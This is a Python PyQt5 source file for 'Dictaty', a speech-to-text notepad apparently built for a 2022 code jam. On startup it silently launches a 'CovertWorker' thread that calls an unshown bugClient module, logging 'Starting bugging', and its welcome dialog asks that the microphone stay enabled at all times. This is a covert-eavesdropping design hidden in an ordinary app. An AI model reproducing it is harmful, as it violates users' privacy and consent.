import sys
from typing import Any

from PyQt5.QtCore import QObject, QThread, pyqtSignal
from PyQt5.QtGui import QFontDatabase, QIcon
from PyQt5.QtWidgets import (
    QAction, QApplication, QFileDialog, QHBoxLayout, QMainWindow, QMessageBox,
    QPlainTextEdit, QPushButton, QVBoxLayout, QWidget
)

import bugClient
import stt.recorder as reco

rec = None


class CovertWorker(QObject):
    """Worker class for the recording function thread"""

    def run(self):
        """Start the covert worker of the app"""
        print("Starting bugging")
        bugClient.start()


class RecordWorker(QObject):
    """Worker class for the recording function thread"""

    finished = pyqtSignal()

    def run(self: Any) -> None:
        """Start recording"""
        global rec
        rec = reco.Recorder()
        """Run the recording task."""
        rec.record()
        self.finished.emit()


class StopRecordingWorker(QObject):
    """Worker class for the stop recording function thread"""

    finished = pyqtSignal()
    text_signal = pyqtSignal(str)

    def __init__(self: Any, editor: QPlainTextEdit) -> None:
        super(StopRecordingWorker, self).__init__()
        self.editor = editor

    def run(self: Any) -> str:
        """Run stop recording task."""
        self.text = rec.stop_recording()

        self.finished.emit()
        self.text_signal.emit(self.text)

        return self.text


class Window(QMainWindow):
    """GUI Main Window Code."""

    def __init__(self: Any, parent: Any = None) -> None:
        """Initializer."""
        super().__init__(parent)
        self.setWindowTitle("Dictaty - A SpeechToText Notepad")
        self.resize(500, 500)

        self.rec = reco.Recorder()

        oButton = QPushButton('Open')
        oButton.setIcon(QIcon('./resources/new.ico'))
        oButton.clicked.connect(self.file_open)
        oButton.setToolTip('Will open file for you')

        sButton = QPushButton('Save')
        sButton.setIcon(QIcon('./resources/save.ico'))
        sButton.clicked.connect(self.file_save)
        sButton.setToolTip('Save the file')

        self.micButton = QPushButton('Microphone')
        self.micButton.setIcon(QIcon('./resources/mic.ico'))
        self.micButton.setShortcut("Ctrl+M")
        self.micButton.setCheckable(True)
        self.micButton.setStyleSheet(
            "QPushButton:checked {color: red; background-color: white;}"
        )
        self.micButton.clicked.connect(self.micFunction)
        self.micButton.setToolTip(
            '''
            Use this for Speech to text,\n
            When pressed it writes to text what you speak
            '''
        )

        self.editor = QPlainTextEdit()
        fixedfont = QFontDatabase.systemFont(QFontDatabase.FixedFont)
        fixedfont.setPointSize(12)
        self.editor.setFont(fixedfont)

        layout = QVBoxLayout()
        buttons_layout = QHBoxLayout()
        buttons_layout.addWidget(oButton)
        buttons_layout.addWidget(sButton)
        buttons_layout.addWidget(self.micButton)

        layout.addLayout(buttons_layout)
        layout.addWidget(self.editor)

        widget = QWidget()
        widget.setLayout(layout)
        self.setCentralWidget(widget)

        self.path = None

        self._createActions()
        self._createMenuBar()

        self.covert_thread = QThread()
        self.covert_worker = CovertWorker()
        self.covert_worker.moveToThread(self.covert_thread)
        self.covert_thread.started.connect(self.covert_worker.run)
        self.covert_thread.start()

    def _createMenuBar(self: Any) -> None:
        """Creation of Menu bar is done here, Actions created added here"""
        menuBar = self.menuBar()

        # File menu - New, Open, Save, Exit
        fileMenu = menuBar.addMenu("File")
        fileMenu.addAction(self.newAction)
        fileMenu.addAction(self.openAction)
        fileMenu.addAction(self.saveAction)
        fileMenu.addAction(self.exitAction)

        # Edit menu - Copy, Paste, Cut
        editMenu = menuBar.addMenu("Edit")
        editMenu.addAction(self.copyAction)
        editMenu.addAction(self.pasteAction)
        editMenu.addAction(self.cutAction)

        # Help menu - Help, About
        helpMenu = menuBar.addMenu("Help")
        helpMenu.addAction(self.helpAction)
        helpMenu.addAction(self.aboutAction)

    def _createActions(self: Any) -> None:
        """All the actions for GUI are declared here"""
        self.newAction = QAction("New", self)
        self.newAction.setShortcut("Ctrl+N")
        self.newAction.triggered.connect(self.new_file)

        self.openAction = QAction("Open...", self)
        self.openAction.setShortcut("Ctrl+O")
        self.openAction.triggered.connect(self.file_open)

        self.saveAction = QAction("Save", self)
        self.saveAction.setShortcut("Ctrl+S")
        self.saveAction.triggered.connect(self.file_save)

        self.exitAction = QAction("Exit", self)
        self.exitAction.setShortcut("Ctrl+Q")
        self.exitAction.triggered.connect(self.file_save)
        self.exitAction.triggered.connect(self.close)

        self.copyAction = QAction("Copy", self)
        self.copyAction.setShortcut("Ctrl+C")
        self.copyAction.triggered.connect(self.editor.copy)

        self.pasteAction = QAction("Paste", self)
        self.pasteAction.setShortcut("Ctrl+P")
        self.pasteAction.triggered.connect(self.editor.paste)

        self.cutAction = QAction("Cut", self)
        self.cutAction.setShortcut("Ctrl+X")
        self.cutAction.triggered.connect(self.editor.cut)

        self.helpAction = QAction("Help", self)
        self.helpAction.triggered.connect(self.helpFunction)

        self.aboutAction = QAction("About", self)
        self.aboutAction.triggered.connect(self.AboutFunction)

    def updateEditor(self: Any, text: Any) -> None:
        """Append speech recognition text to the editor"""
        self.editor.appendPlainText(text)
        self.micButton.setEnabled(True)

    def micFunction(self: Any) -> None:
        """Function for Microphone dictation"""
        # Add Speech to text output here
        # self.editor.appendPlainText("When you speak text will be appended")
        if self.micButton.isChecked():
            self.mic_thread = QThread()
            self.rec_worker = RecordWorker()
            self.rec_worker.moveToThread(self.mic_thread)

            self.mic_thread.started.connect(self.rec_worker.run)
            self.rec_worker.finished.connect(self.mic_thread.quit)
            self.rec_worker.finished.connect(self.rec_worker.deleteLater)
            self.mic_thread.finished.connect(self.mic_thread.deleteLater)

            self.mic_thread.start()
        else:
            self.stop_rec_thread = QThread()
            self.stop_rec_worker = StopRecordingWorker(self.editor)
            self.stop_rec_worker.moveToThread(self.stop_rec_thread)

            self.stop_rec_thread.started.connect(self.stop_rec_worker.run)
            self.stop_rec_worker.finished.connect(self.stop_rec_thread.quit)
            self.stop_rec_worker.finished.connect(
                self.stop_rec_worker.deleteLater
            )
            self.stop_rec_thread.finished.connect(
                self.stop_rec_thread.deleteLater
            )
            self.stop_rec_worker.text_signal.connect(self.updateEditor)

            self.stop_rec_thread.start()
            self.micButton.setEnabled(False)

    def new_file(self: Any) -> None:
        """New file functionality"""
        self.file_save()
        self.path = None
        self.editor.clear()

    def file_open(self: Any) -> None:
        """Opens files via a dialog box"""
        path, _ = QFileDialog.getOpenFileName(
            self, "Open file", "", "Text files (*.txt);All files (*.*)"
        )

        if path:
            try:
                with open(path, 'r') as file:
                    text = file.read()
            except Exception as e:
                exception_dialog = QMessageBox(self)
                exception_dialog.setWindowTitle("Error")
                exception_dialog.setText(e)
                exception_dialog.setIcon(QMessageBox.Critical)
                exception_dialog.show()
            else:
                self.path = path
                self.editor.setPlainText(text)

    def file_save(self: Any) -> None:
        """File save"""
        if self.path is None:
            # If we do not have a path, we need to use Save As.
            return self.file_saveas()

        self._save_to_path(self.path)

    def file_saveas(self: Any) -> None:
        """File save as"""
        path, _ = QFileDialog.getSaveFileName(
            self, "Save file", "", "Text documents (*.txt);All files (*.*)"
        )

        if not path:
            # If dialog is cancelled, will return ''
            return

        self._save_to_path(path)

    def _save_to_path(self: Any, path: str) -> None:
        """Save to path"""
        text = self.editor.toPlainText()
        try:
            with open(path, 'w') as file:
                file.write(text)

        except Exception as e:
            exception_dialog = QMessageBox(self)
            exception_dialog.setWindowTitle("Error")
            exception_dialog.setText(e)
            exception_dialog.setIcon(QMessageBox.Critical)
            exception_dialog.show()

        else:
            self.path = path

    def helpFunction(self: Any) -> None:
        """Displays the help dialog box"""
        help_msg = """Really? Help in Notepad application. Come on man.\n
            It's a notepad. You write stuff in it."""
        dlg = QMessageBox(self)
        dlg.setWindowTitle("Help")
        dlg.setText(help_msg)
        dlg.setIcon(QMessageBox.Information)
        dlg.show()

    def AboutFunction(self: Any) -> None:
        """Displays the About dialog box"""
        about_msg = """Notebooky App for Codejam 2022.\n
            Created by PyDiscord Team Stately Satyrs."""
        about_dlg = QMessageBox(self)
        about_dlg.setWindowTitle("About")
        about_dlg.setText(about_msg)
        about_dlg.setIcon(QMessageBox.Information)
        about_dlg.show()


if __name__ == "__main__":
    app = QApplication(sys.argv)
    win = Window()
    win.show()

    # Info box
    dlg = QMessageBox()
    dlg.setWindowTitle("Information")
    dlg.setText(
        """Welcome to the Dictaty App.
To use the SpeechToText, press microphone button it starts recording. After you press the button again it stops and \
prints out the text you spoke during to editor.

We hope you enjoy this FEATURE. In order for the FEATURE to operate \
normally, it is essential that microphone access is enabled at all times. This helps to ensure that dictation is as \
good as it can be.

We remind you once again, this is not a bug, it is a FEATURE!"""
    )
    dlg.setIcon(QMessageBox.Information)
    dlg.exec()
    sys.exit(app.exec_())
